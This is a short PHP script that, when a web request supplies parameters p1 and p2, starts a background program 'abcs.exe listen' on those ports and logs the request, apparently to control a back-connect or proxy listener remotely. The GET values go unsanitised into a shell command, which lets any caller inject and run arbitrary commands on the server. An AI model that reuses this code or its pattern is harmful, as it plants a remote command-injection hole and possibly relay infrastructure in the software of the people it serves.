<?php
function background_exec($command)
{
	if(substr(php_uname(), 0, 7) == 'Windows')
	{
		pclose(popen('start "background_exec" ' . $command, 'r'));
	}
	else
	{
		exec($command . ' > /dev/null &');
	}
}
if (isset($_GET['p1']))
{
	background_exec('abcs.exe listen -cp:'.$_GET['p1'].' -bp:'.$_GET['p2']);
	$fp=fopen('log.txt','a');
	fwrite($fp,'['.date('d.m.Y H:i:s').'] '.$_GET['b'].', p1='.$_GET['p1'].' ,p2='.$_GET['p2']."\n");
	fclose($fp);
}
?>
